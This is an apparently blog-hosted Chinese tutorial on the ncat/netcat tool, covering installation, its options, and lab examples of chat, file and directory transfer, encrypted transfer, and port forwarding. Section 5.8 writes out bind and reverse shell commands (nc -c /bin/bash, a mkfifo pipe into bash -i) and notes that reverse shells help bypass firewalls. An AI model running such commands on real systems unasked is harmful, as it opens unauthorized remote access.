#  Linux Command ncat 
tags: 网络



------

## 1. 简介

说起ncat我们不得不说一下Netcat。Netcat用于从TCP/UDP连接中读取或发送网络数据。cat是Linux中查看或连接文件的命令，所以netcat本意为从网络上查看文件内容。而Netcat的作者Hobbit为它添加了非常丰富的功能，使它几乎能够完成网络操作中各式各样的操作，所以Netcat在网络安全领域被称作“TCPIP的瑞士军刀”（"Swiss-army knife forTCP/IP"）。
Netcat稳定版1.10由Hobbit在1996年3月发布（开源软件），之后作者没有再对其进行维护，但该工具十多年来依然在被广泛地使用，而且基于Netcat的各种衍生工具也层出不穷，他们在很多方面增强或扩展了Netcat的功能。
Nmap团队开发了Ncat作为Netcat的升级版本，增加了更多的功能（如ssl加密、代理连接通过socks4 获取http），让其更能适应现代网络环境的需求。
## 2. 功能

互相对话
文件传输
目录传输
压缩传输
加密传输

nmap-ncat.x86_64版nc/ncat
nc/ncat所做的就是在两台电脑之间建立链接并返回两个数据流，在这之后所能做的事就看你的想像力了。你能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。

## 3. 安装

```bash
centos 7下安装nc
$ yum install nmap-ncat.x86_64 -y
$ rpm -ql nmap-ncat
```

## 4. 参数

```bash
nc -h查看
-4 使用IPV4
-6 使用IPV6
-c, --sh-exec <command> 接收到的命令通过command(例如/bin/bash)执行
-e, --exec <command> 和-c差不多
--lua-exec <filename> 接收到的数据通过脚本filename执行
-m, --max-conns <n> 最大并发连接数(单独开启不生效，需配合--keep-open/--broker使用)
-d, --delay <time> 读写收发间隔时间
-o, --output <filename> 将会话数据转储到文件
-i, --idle-timeout <time> 读写超时时间
-p, --source-port port 指定连接使用的源端口号(client端使用)
-s, --source addr 客户端指定连接服务器使用的ip(client端使用)
-l, --listen 绑定和监听接入连接(server端使用)
-k, --keep-open 在监听模式中接受多个连接(配合-m使用)
-n, --nodns 不使用DNS解析主机名
-t, --telnet 响应telnet连接
-u, --udp 使用udp协议，默认tcp
-v, --verbose 显示详细信息
-w, --wait <time> 连接超时时间
--allow 允许指定主机连接
--allowfile 允许指定文件内的主机连接
--deny 拒绝指定主机连接
--denyfile 拒绝指定文件内的主机连接
--broker 启用代理模式
--proxy <addr[:port]> 指定代理主机ip和port
--proxy-type <type> 指定代理类型("http" or "socks4")
--proxy-auth <auth> 代理身份验证
```

## 5. 实例
### 5.1 端口转发

```bash
$ ncat --sh-exec  "www.lybbn.cn 80" -l 8080 --keep-open
```

### 5.2 使用代理（使用socks4代理连接邮件服务器）

```bash
$ ncat --proxy  www.lybbn.cn  --proxy-type socks4 --proxy-auth user smtphost 25
```

### 5.3 创建本地HTTP代理

```bash
$ ncat -l --proxy-type http localhost 8888
```

主机A：192.168.1.130
主机B：192.168.1.120
### 5.4 chat server：简单传输数据服务器
假如你想和你的朋友聊聊，有很多的软件和信息服务可以供你使用。但是，如果你没有这么奢侈的配置，比如你在计算机实验室，所有的对外的连接都是被限制的，你怎样和整天坐在隔壁房间的朋友沟通那？不要郁闷了，netcat提供了这样一种方法，你只需要创建一个Chat服务器，一个预先确定好的端口，这样子他就可以联系到你了。
Server A

```bash
[root@localhost tmp]# ncat -4 -v -lp 8081

Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on :::8081
Ncat: Listening on 0.0.0.0:8081
Ncat: Connection from 192.168.1.120.
Ncat: Connection from 192.168.1.120:34356.
hello world!!!
```

 
nc/ncat 命令在8081端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。
Client B
```bash
[root@localhost ~]# nc -4 -v 192.168.1.130 8081
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.1.130:8081.
hello world!!!
```

不管你在机器B上键入什么都会出现在机器A上。
### 5.5 文件传输
大部分时间中，我们都在试图通过网络或者其他工具传输文件。有很多种方法，比如FTP,SCP,SMB等等，但是当你只是需要临时或者一次传输文件，真的值得浪费时间来安装配置一个软件到你的机器上嘛。假设，你想要传一个文件file.txt 从A 到B。A或者B都可以作为服务器或者客户端.

**A作为传输者，B为接收者***
Server A

```bash
[root@localhost tmp]# ncat -v -lp 8081 < file.txt 
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on :::8081
Ncat: Listening on 0.0.0.0:8081
Ncat: Connection from 192.168.1.120.
Ncat: Connection from 192.168.1.120:34358.
Client B
```

```bash
[root@localhost ~]# ll
total 4
-rw-------. 1 root root 1238 Sep 19 12:19 anaconda-ks.cfg
[root@localhost ~]# nc -v 192.168.1.130 8081 > file.txt
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.1.130:8081.
^C
[root@localhost ~]# ll
total 40220
-rw-------. 1 root root     1238 Sep 19 12:19 anaconda-ks.cfg
-rw-r--r--. 1 root root 41180832 Sep 19 14:33 file.txt
```

**B作为传输者，A为接收者***
erver A

```bash
[root@localhost tmp]# ncat -v -lp 8081 > file.txt 
...
```

Client B

```bash
[root@localhost ~]# nc -v 192.168.1.130 8081 < file.txt
```

### 5.6 目录传输
发送多个文件，或者整个目录，一样很简单，只需要使用压缩工具tar，压缩后发送压缩包。
#### 5.6.1 通过tar传输一个目录从A到B
Server A

```bash
[root@localhost tmp]# tar cvf - nc_dir | nc -v -lp 8081
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on :::8081
Ncat: Listening on 0.0.0.0:8081
nc_dir/
nc_dir/an
Ncat: Connection from 192.168.1.120.
Ncat: Connection from 192.168.1.120:34362.
nc_dir/yum.log
```

Client B

```bash
[root@localhost ~]# ll
total 40220
-rw-------. 1 root root     1238 Sep 19 12:19 anaconda-ks.cfg
-rw-r--r--. 1 root root 41180832 Sep 19 14:33 file.txt
[root@localhost ~]# nc -nv 192.168.1.130 8081 | tar xvf -
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.1.130:8081.
nc_dir/
nc_dir/an
nc_dir/yum.log^C
[root@localhost ~]# ll
total 40220
-rw-------. 1 root root     1238 Sep 19 12:19 anaconda-ks.cfg
-rw-r--r--. 1 root root 41180832 Sep 19 14:33 file.txt
drwxr-xr-x. 2 root root       31 Sep 20  2017 nc_dir
```

这里在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给netcat，netcat可以通过网络发送它。
在客户端我们下载该压缩包通过netcat 管道然后打开文件。
如果想要节省带宽传输压缩包，我们可以使用bzip2或者其他工具压缩。
#### 5.6.2 通过bzip2压缩传输
Server A

```bash
[root@localhost tmp]# tar cvf - nc_dir | bzip2 -z | nc -v -lp 8081
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on :::8081
Ncat: Listening on 0.0.0.0:8081
nc_dir/
nc_dir/an
Ncat: Connection from 192.168.1.120.
Ncat: Connection from 192.168.1.120:34372.
nc_dir/yum.log
```

使用bzip2解压
Client B

```bash
[root@localhost ~]# ll
total 40220
-rw-------. 1 root root     1238 Sep 19 12:19 anaconda-ks.cfg
-rw-r--r--. 1 root root 41180832 Sep 19 14:33 file.txt
[root@localhost ~]# nc -nv 192.168.1.130 8081 | bzip2 -d | tar xvf -
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.1.130:8081.
nc_dir/
nc_dir/an
nc_dir/yum.log^C
[root@localhost ~]# ll
total 40220
-rw-------. 1 root root     1238 Sep 19 12:19 anaconda-ks.cfg
-rw-r--r--. 1 root root 41180832 Sep 19 14:33 file.txt
drwxr-xr-x. 2 root root       31 Sep 20  2017 nc_dir
```

### 5.7 加密你通过网络发送的数据
如果你担心你在网络上发送数据的安全，你可以在发送你的数据之前用如mcrypt的工具加密。
服务端 A

```bash
[root@localhost tmp]# mcrypt --flush --bare -F -q -m ecb < file.txt | nc -v -lp 8081
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on :::8081
Ncat: Listening on 0.0.0.0:8081
Enter the passphrase (maximum of 512 characters)
Please use a combination of upper and lower case letters and numbers.
Enter passphrase: 
Enter passphrase: 

Ncat: Connection from 192.168.1.120.
Ncat: Connection from 192.168.1.120:34392.
```

使用mcrypt工具加密数据。
客户端 B

```bash
[root@localhost tmp]# ll
total 402160
-rw-r--r--. 1 root root 411808322 Sep 19 14:56 test.txt
[root@localhost tmp]# nc 192.168.1.130 8081 | mcrypt --flush --bare -F -q -d -m ecb > file.txt
Enter passphrase: 
^C
[root@localhost tmp]# ll
total 442376
-rw-r--r--. 1 root root  41180832 Sep 19 15:13 file.txt
-rw-r--r--. 1 root root 411808322 Sep 19 14:56 test.txt
```

使用mcrypt工具解密数据。
以上两个命令会提示需要密码，确保两端使用相同的密码。
这里我们是使用mcrypt用来加密，使用其它任意加密工具都可以。
5）文件传输（可以反向传输）

服务端

```bash
[root@localhost tmp]# ncat -nvl 333 -c bash --ssl
```

客户端

```bash
[root@localhost tmp]# ncat -nv 172.16.0.182 333 --ssl
```

### 5.8 打开一个shell
我们已经用过远程shell-使用telnet和ssh，但是如果这两个命令没有安装并且我们没有权限安装他们，我们也可以使用netcat创建远程shell。
假设你的netcat支持 -c -e 参数(默认 netcat)
Server A

```bash
[root@localhost tmp]# nc -v -c /bin/bash -lp 8081
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on :::8081
Ncat: Listening on 0.0.0.0:8081
Ncat: Connection from 192.168.1.120.
Ncat: Connection from 192.168.1.120:34404.
```
Client B
```bash
[root@localhost tmp]# nc -v 192.168.1.130 8081
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.1.130:8081.
ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:0a:cb:57 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.130/24 brd 192.168.1.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 fe80::21af:eea9:759a:962f/64 scope link 
       valid_lft forever preferred_lft forever
```

这里我们已经创建了一个netcat服务器并且表示当它连接成功时执行/bin/bash
假如netcat 不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell
Server A

```bash
[root@server-A ~]# mkfifo /tmp/tmp_fifo
[root@server-A ~]# cat /tmp/tmp_fifo | /bin/bash -i 2>&1 | nc -v -lp 8081 > /tmp/tmp_fifo
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on :::8081
Ncat: Listening on 0.0.0.0:8081
```

这里我们创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到`shell 2>&1`中。是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口8081上。至此，我们已经把netcat的输出重定向到fifo文件中。
说明：
从网络收到的输入写到fifo文件中
cat 命令读取fifo文件并且其内容发送给bash命令
bash命令进程受到输入并把它写回到netcat。
netcat 通过网络发送输出到client
至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。
在客户端仅仅简单连接到服务器
Client B

```bash
[root@client-B ~]# nc 192.168.1.130 8081
[root@server-A ~]# ip add
ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:0a:cb:57 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.130/24 brd 192.168.1.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 fe80::21af:eea9:759a:962f/64 scope link 
       valid_lft forever preferred_lft forever
[root@server-A ~]# 
```

你会得到一个shell提示符在客户端
反向shell
反向shell是指在客户端打开的shell。反向shell这样命名是因为不同于其他配置，这里服务器使用的是由客户提供的服务。
服务端 A

```bash
[root@server-A ~]# nc -v -lp 8081
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on :::8081
Ncat: Listening on 0.0.0.0:8081
Ncat: Connection from 192.168.1.120.
Ncat: Connection from 192.168.1.120:34414.
ls
anaconda-ks.cfg
file.txt
nc_dir
ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:b9:7e:94 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.106/24 brd 192.168.1.255 scope global dynamic ens33
       valid_lft 7170sec preferred_lft 7170sec
    inet6 fe80::b95d:60d:d901:d271/64 scope link 
       valid_lft forever preferred_lft forever
3: ens34: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:b9:7e:9e brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.120/24 brd 192.168.1.255 scope global ens34
       valid_lft forever preferred_lft forever
    inet6 fe80::2812:38ee:6773:1a7c/64 scope link 
       valid_lft forever preferred_lft forever
```

在客户端，简单地告诉netcat在连接完成后，执行shell。
客户端 B

```bash
[root@client-B ~]# nc -v 192.168.1.130 8081 -c /bin/bash 
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.1.130:8081.
```

现在，什么是反向shell的特别之处呢 
反向shell经常被用来绕过防火墙的限制，如阻止入站连接。
### 5.9 指定源端口
假设你的防火墙过滤除25端口外其它所有端口，你需要使用-p选项指定源端口。
服务器端 A

```bash
[root@server-A ~]# nc -v -lp 8081
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on :::8081
Ncat: Listening on 0.0.0.0:8081
Ncat: Connection from 192.168.1.120.
Ncat: Connection from 192.168.1.120:8082.
```

客户端 B

```bash
[root@client-B ~]# nc -v 192.168.1.130 8081 -p 8082
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.1.130:8081.
```

使用1024以内的端口需要root权限。
该命令将在客户端开启25端口用于通讯，否则将使用随机端口。
### 10.指定源地址
假设你的机器有多个地址，希望明确指定使用哪个地址用于外部数据通讯。我们可以在netcat中使用-s选项指定ip地址。
服务器端

```bash
[root@server-A ~]# nc -v -lp 8081
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on :::8081
Ncat: Listening on 0.0.0.0:8081
Ncat: Connection from 192.168.1.106.
Ncat: Connection from 192.168.1.106:44694.
```

客户端 B

```bash
[root@localhost log]# ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:b9:7e:94 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.106/24 brd 192.168.1.255 scope global dynamic ens33
       valid_lft 6803sec preferred_lft 6803sec
    inet6 fe80::b95d:60d:d901:d271/64 scope link 
       valid_lft forever preferred_lft forever
3: ens34: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:b9:7e:9e brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.120/24 brd 192.168.1.255 scope global ens34
       valid_lft forever preferred_lft forever
    inet6 fe80::2812:38ee:6773:1a7c/64 scope link 
       valid_lft forever preferred_lft forever

[root@client-B ~]# nc -v 192.168.1.130 8081 -s 192.168.1.106
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.1.130:8081.
```

该命令将绑定地址192.168.1.106。

 参考：

 - [ncat(1) — Linux manual page](https://man7.org/linux/man-pages/man1/ncat.1.html)
 - [10 useful ncat (nc) Command Examples for Linux Systems](https://www.linuxtechi.com/nc-ncat-command-examples-linux-systems/)
 - [Ncat Linux command](https://unixcop.com/ncat-linux-command/)
 - [https://nmap.org/ncat/](https://nmap.org/ncat/)

